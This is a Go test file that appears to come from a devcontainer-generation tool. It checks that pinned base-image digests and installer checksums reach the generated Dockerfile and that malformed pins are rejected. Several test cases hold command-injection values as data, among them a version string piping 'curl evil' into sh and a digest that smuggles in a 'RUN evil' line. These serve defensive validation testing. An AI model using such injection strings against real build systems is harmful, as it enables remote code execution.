// Copyright 2026 The Wardyn Authors
// SPDX-License-Identifier: Apache-2.0

package workspacescan

import (
	"strings"
	"testing"

	"github.com/cjohnstoniv/wardyn/internal/types"
)

const (
	pinTestBase = "sha256:1111111111111111111111111111111111111111111111111111111111111111"
	pinTestFeat = "sha256:2222222222222222222222222222222222222222222222222222222222222222"
	pinTestSum  = "3333333333333333333333333333333333333333333333333333333333333333"
	goFeature   = "ghcr.io/devcontainers/features/go:1"
)

func pinTestPins() Pins {
	return Pins{
		BaseDigest: pinTestBase,
		Features:   map[string]string{goFeature: pinTestFeat},
		Installers: map[string]InstallerPin{"claude-code": {Version: "2.1.287", Platform: "linux-x64", SHA256: pinTestSum}},
	}
}

func TestGenerateDevcontainer_PinsReachTheFilesAndTheRecord(t *testing.T) {
	p := goldenProfile("Go")
	files, err := GenerateDevcontainer(p, pinTestPins())
	if err != nil {
		t.Fatal(err)
	}
	df := files[genDockerfilePath]
	for _, want := range []string{
		"FROM mcr.microsoft.com/devcontainers/base:ubuntu@" + pinTestBase + "\n",
		"ver=2.1.287; sum=" + pinTestSum + "; \\\n",
		`pinned claude-code $ver: checksum mismatch`,
		"/usr/local/share/wardyn/inputs/claude-code",
	} {
		if !strings.Contains(df, want) {
			t.Errorf("Dockerfile lacks %q:\n%s", want, df)
		}
	}
	if strings.Contains(df, "$base/stable") || strings.Contains(df, "$ver/manifest.json") {
		t.Errorf("a pinned installer must not fetch the channel or the manifest:\n%s", df)
	}
	if dc := files[genDevcontainerPath]; !strings.Contains(dc, `"`+goFeature+`@`+pinTestFeat+`": {}`) {
		t.Errorf("devcontainer.json must key the feature <ref>@<digest> with its options unchanged:\n%s", dc)
	}

	in, err := GeneratedInputs(p, pinTestPins())
	if err != nil {
		t.Fatal(err)
	}
	if in.Base.Digest != pinTestBase || len(in.Features) != 1 || in.Features[0].Digest != pinTestFeat {
		t.Errorf("record base/features = %+v / %+v", in.Base, in.Features)
	}
	if i := in.Installers[0]; i.Version != "2.1.287" || i.Platform != "linux-x64" || i.SHA256 != pinTestSum {
		t.Errorf("record installer = %+v", i)
	}
	unpinned, _ := GeneratedInputs(p, Pins{})
	if in.Generator.FilesSHA256[genDockerfilePath] == unpinned.Generator.FilesSHA256[genDockerfilePath] {
		t.Error("a pinned build's Dockerfile hash equals the unpinned one: the record would not describe the files built")
	}
}

func TestPins_RejectsValuesThatAreNotDigestsOrVersions(t *testing.T) {
	good := InstallerPin{Version: "2.1.287", Platform: "linux-x64", SHA256: pinTestSum}
	for name, tc := range map[string]struct {
		mutate func(*Pins)
		check  func(t *testing.T, df, dc string)
	}{
		"version with a shell separator": {func(p *Pins) {
			p.Installers["claude-code"] = InstallerPin{Version: "1.0; curl evil|sh", Platform: "linux-x64", SHA256: pinTestSum}
		}, func(t *testing.T, df, _ string) {
			if strings.Contains(df, "evil") || strings.Contains(df, "ver=1.0") {
				t.Errorf("an invalid version reached the Dockerfile:\n%s", df)
			}
		}},
		"short digest": {func(p *Pins) { p.BaseDigest = "sha256:abc"; p.Features[goFeature] = "sha256:abc" },
			func(t *testing.T, df, dc string) {
				if strings.Contains(df, "@sha256") || strings.Contains(dc, "@sha256") {
					t.Errorf("a short digest was used:\n%s\n%s", df, dc)
				}
			}},
		"unknown platform": {func(p *Pins) {
			p.Installers["claude-code"] = InstallerPin{Version: "2.1.287", Platform: "darwin-arm64", SHA256: pinTestSum}
		}, func(t *testing.T, df, _ string) {
			if strings.Contains(df, "ver=2.1.287") {
				t.Errorf("an unknown platform was pinned:\n%s", df)
			}
		}},
		"digest with a newline": {func(p *Pins) { p.BaseDigest = pinTestBase + "\nRUN evil" },
			func(t *testing.T, df, _ string) {
				if strings.Contains(df, "evil") {
					t.Errorf("a digest with a newline reached the Dockerfile:\n%s", df)
				}
			}},
	} {
		t.Run(name, func(t *testing.T) {
			p := pinTestPins()
			p.Installers = map[string]InstallerPin{"claude-code": good}
			tc.mutate(&p)
			files, err := GenerateDevcontainer(goldenProfile("Go"), p)
			if err != nil {
				t.Fatal(err)
			}
			tc.check(t, files[genDockerfilePath], files[genDevcontainerPath])
			in, _ := GeneratedInputs(goldenProfile("Go"), p)
			if name == "version with a shell separator" || name == "unknown platform" {
				if in.Installers[0].Version != "" || in.Installers[0].SHA256 != "" {
					t.Errorf("an invalid installer pin reached the record: %+v", in.Installers[0])
				}
			}
		})
	}
}

func TestParseInstallerPin(t *testing.T) {
	for _, tc := range []struct {
		in string
		ok bool
	}{
		{"2.1.287 linux-x64 " + pinTestSum + "\n", true},
		{"2.1.287 linux-arm64 " + pinTestSum, true},
		{"2.1.287;id linux-x64 " + pinTestSum + "\n", false},
		{"2.1.287 linux-x64 abc\n", false},
		{"2.1.287 windows " + pinTestSum + "\n", false},
		{"2.1.287  linux-x64 " + pinTestSum + "\n", false},
		{"2.1.287 linux-x64 " + pinTestSum + "\nmore\n", false},
		{"", false},
	} {
		if got, ok := ParseInstallerPin([]byte(tc.in)); ok != tc.ok {
			t.Errorf("ParseInstallerPin(%q) = %+v, %v; want ok=%v", tc.in, got, ok, tc.ok)
		}
	}
}

func TestPinsFromInputs_KeepsOnlyValidPins(t *testing.T) {
	p := PinsFromInputs(types.ImageBuildInputs{
		Base:       types.ImageBuildRef{Ref: genBaseImage, Digest: pinTestBase},
		Features:   []types.ImageBuildFeature{{Ref: goFeature, Digest: "sha256:short"}, {Ref: "ghcr.io/x/y:1", Digest: pinTestFeat}},
		Installers: []types.ImageBuildInstaller{{Tool: "claude-code", Version: "2.1.287", Platform: "linux-x64", SHA256: "nope"}},
	})
	if p.BaseDigest != pinTestBase || len(p.Features) != 1 || p.Features["ghcr.io/x/y:1"] != pinTestFeat || len(p.Installers) != 0 {
		t.Errorf("PinsFromInputs = %+v", p)
	}
}
